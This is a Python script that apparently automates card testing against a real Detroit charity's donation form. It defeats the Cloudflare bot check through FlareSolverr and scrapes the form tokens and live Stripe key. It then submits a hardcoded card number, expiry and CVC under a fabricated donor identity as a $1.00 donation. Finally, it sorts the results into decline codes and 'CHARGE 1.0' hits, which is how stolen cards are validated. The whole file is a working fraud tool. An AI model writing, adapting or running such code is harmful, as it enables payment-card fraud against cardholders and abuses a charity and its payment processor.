import time
import re
import json
import random
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


FLARESOLVERR_URL = 'http://localhost:8191/v1'

URL = 'https://higherhopesdetroit.org/donation/'
FORM_ID = '1057'
FORM_HASH = 'ee0e509410'
FORM_PREFIX = '1057-1'
STRIPE_KEY = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'

CARD_NUMBER = '5104040287872188'
EXP_MONTH = '12'
EXP_YEAR = '27'
CVC = '951'

FIRST_NAME = 'James'
LAST_NAME = 'Smith'
EMAIL = f'james{random.randint(100,999)}@gmail.com'
ADDRESS = '123 Main Street'
CITY = 'New York'
STATE = 'NY'
ZIP = '10001'
COUNTRY = 'US'


def step1_open_page():
    print("=" * 60)
    print("STEP 1: Opening page via FlareSolverr")
    print("=" * 60)
    
    payload = {
        'cmd': 'request.get',
        'url': URL,
        'maxTimeout': 60000,
    }
    
    try:
        print("⏳ Asking FlareSolverr...")
        response = requests.post(FLARESOLVERR_URL, json=payload, timeout=90)
        
        print(f"📥 Status: {response.status_code}")
        
        data = response.json()
        
        if data.get('status') != 'ok':
            return None, f"FLARESOLVERR_ERROR: {data.get('message', 'unknown')}"
        
        solution = data.get('solution', {})
        html = solution.get('response', '')
        cookies = solution.get('cookies', [])
        user_agent = solution.get('userAgent', '')
        
        print(f"📄 HTML Length: {len(html)}")
        print(f"🍪 Cookies: {len(cookies)}")
        
        html_lower = html.lower()
        
        if 'just a moment' in html_lower or 'checking your browser' in html_lower:
            return None, "CLOUDFLARE_STILL_ACTIVE"
        
        if 'give-form-id' not in html:
            return None, "NO_GIVE_FORM"
        
        print("✅ Page loaded via FlareSolverr!")
        
        form_id = None
        form_hash = None
        form_prefix = None
        stripe_key = None
        
        m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
        if m:
            form_id = m.group(1)
        
        m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
        if m:
            form_hash = m.group(1)
        
        m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
        if m:
            form_prefix = m.group(1)
        
        m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
        if m:
            stripe_key = m.group(0)
        
        print(f"✅ Form ID: {form_id}")
        print(f"✅ Form Hash: {form_hash}")
        print(f"✅ Form Prefix: {form_prefix}")
        print(f"✅ Stripe Key: {stripe_key}")
        
        session = requests.Session()
        session.verify = False
        
        for cookie in cookies:
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=cookie.get('domain', '.higherhopesdetroit.org')
            )
        
        session.headers.update({
            'user-agent': user_agent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
        })
        
        return {
            'session': session,
            'html': html,
            'form_id': form_id or FORM_ID,
            'form_hash': form_hash or FORM_HASH,
            'form_prefix': form_prefix or FORM_PREFIX,
            'stripe_key': stripe_key or STRIPE_KEY,
        }, "OK"
    
    except Exception as e:
        return None, f"ERROR: {str(e)[:150]}"


def step2_create_stripe_pm(data):
    print("\n" + "=" * 60)
    print("STEP 2: Creating Stripe PM")
    print("=" * 60)
    
    stripe_url = 'https://api.stripe.com/v1/payment_methods'
    
    payload = {
        'type': 'card',
        'card[number]': CARD_NUMBER,
        'card[exp_month]': EXP_MONTH,
        'card[exp_year]': EXP_YEAR,
        'card[cvc]': CVC,
        'billing_details[name]': f'{FIRST_NAME} {LAST_NAME}',
        'billing_details[email]': EMAIL,
        'billing_details[address][line1]': ADDRESS,
        'billing_details[address][city]': CITY,
        'billing_details[address][state]': STATE,
        'billing_details[address][postal_code]': ZIP,
        'billing_details[address][country]': COUNTRY,
        'key': data['stripe_key'],
    }
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
    }
    
    try:
        response = data['session'].post(stripe_url, data=payload, headers=headers, timeout=30)
        
        print(f"📥 Stripe Status: {response.status_code}")
        print(f"📥 Response: {response.text[:400]}")
        
        if response.status_code == 200:
            result = response.json()
            if 'id' in result:
                return result['id'], "OK"
        
        try:
            err = response.json()
            if 'error' in err:
                code = err['error'].get('code', '')
                decline = err['error'].get('decline_code', '')
                message = err['error'].get('message', '')[:100]
                
                if decline:
                    return None, f"STRIPE_{decline.upper()}: {message}"
                if code:
                    return None, f"STRIPE_{code.upper()}: {message}"
                return None, f"STRIPE_ERROR: {message}"
        except:
            pass
        
        return None, f"STRIPE_{response.status_code}"
    
    except Exception as e:
        return None, f"ERROR: {str(e)[:100]}"


def step3_submit_donation(data, pm_id):
    print("\n" + "=" * 60)
    print("STEP 3: Submitting donation")
    print("=" * 60)
    
    donation_url = f'https://higherhopesdetroit.org/donation/?payment-mode=stripe&form-id={data["form_id"]}'
    
    payload = {
        'give-honeypot': '',
        'give-form-id-prefix': data['form_prefix'],
        'give-form-id': data['form_id'],
        'give-form-title': 'Give a Donation',
        'give-current-url': URL,
        'give-form-url': URL,
        'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': data['form_hash'],
        'give-price-id': 'custom',
        'give-amount': '1.00',
        'give_tributes_type': 'In Honor Of',
        'give_tributes_show_dedication': 'no',
        'give_tributes_radio_type': 'In Honor Of',
        'give_tributes_first_name': '',
        'give_tributes_last_name': '',
        'give_stripe_payment_method': pm_id,
        'payment-mode': 'stripe',
        'give_first': FIRST_NAME,
        'give_last': LAST_NAME,
        'give_email': EMAIL,
        'give_comment': 'Donation',
        'card_name': f'{FIRST_NAME} {LAST_NAME}',
        'billing_country': COUNTRY,
        'card_address': ADDRESS,
        'card_address_2': '',
        'card_city': CITY,
        'card_state': STATE,
        'card_zip': ZIP,
        'give_action': 'purchase',
        'give-gateway': 'stripe',
    }
    
    headers = {
        'authority': 'higherhopesdetroit.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://higherhopesdetroit.org',
        'referer': URL,
    }
    
    try:
        response = data['session'].post(donation_url, data=payload, headers=headers, timeout=30)
        
        print(f"📥 Status: {response.status_code}")
        print(f"📄 Length: {len(response.text)}")
        
        return parse_response(response.text, response.status_code)
    
    except Exception as e:
        return f"ERROR: {str(e)[:100]}"


def parse_response(text, status_code):
    text_lower = text.lower()
    
    live_map = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'do_not_honor': 'DO_NOT_HONOR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
    }
    
    for kw, resp in live_map.items():
        if kw in text_lower:
            return resp
    
    if status_code == 200:
        return f"UNKNOWN: {text[:200].strip()}"
    return f"HTTP_{status_code}"


def run():
    print("🚀 STARTING")
    
    data, result = step1_open_page()
    if result != "OK":
        print(f"\n❌ Failed at Step 1: {result}")
        return result
    
    pm_id, result = step2_create_stripe_pm(data)
    if result != "OK":
        print(f"\n❌ Failed at Step 2: {result}")
        return result
    
    final = step3_submit_donation(data, pm_id)
    
    print("\n" + "=" * 60)
    print(f"📊 FINAL: {final}")
    print("=" * 60)
    
    return final


if __name__ == '__main__':
    run()
